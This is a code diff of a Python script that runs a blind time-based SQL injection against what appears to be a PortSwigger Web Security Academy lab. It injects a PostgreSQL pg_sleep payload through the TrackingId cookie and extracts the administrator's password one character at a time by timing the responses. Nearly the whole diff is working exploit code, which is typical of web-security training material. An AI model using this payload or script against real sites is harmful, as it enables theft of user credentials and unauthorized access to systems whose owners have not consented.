@@ -112,24 +112,35 @@ from requests.exceptions import Timeout
 
 characters = list(string.ascii_lowercase)
 characters += list(string.digits)
-url = "" #Target URL
+url = "https://0ae6000204e96b3d80083aee008e003f.web-security-academy.net/" #Target URL
 length = 20
 result = ''
 
-print("[+] Extract Info")
+print("[+] Extracting Password")
 
 for i in range(1, length+1):
+    found_char = False
     for char in characters:
-        payload = "a'%%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,%i,1)='%s')+THEN+pg_sleep(7)+ELSE+pg_sleep(0)+END+FROM+users--" %(i, char)
-        print("Tring Number %i with: " %(i), char)
+        payload = f"a'||(SELECT CASE WHEN (username='administrator' AND SUBSTR(password,{i},1)='{char}') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users)||'"
+        print(f"Trying number {i} with character: {char}")
         cookie = {"TrackingId":payload}
         try:
-            requests.get(url, cookies=cookie , timeout=5)
+            response = requests.get(url, cookies=cookie, timeout=2.5)
+            if response.status_code != 200:
+                print("[+] Got non-200 status code: ", response.status_code)
+                continue
         except Timeout:
+            found_char = True
             result += char
+            print("[+] Found character:", char)
             break
 
-    print("[+] Result is : ", result)
+    if not found_char:
+        print(f"[+] Could not find character at position {i}")
+        break
+
+print("[+] Password is: ", result)
+
 ```
 
 
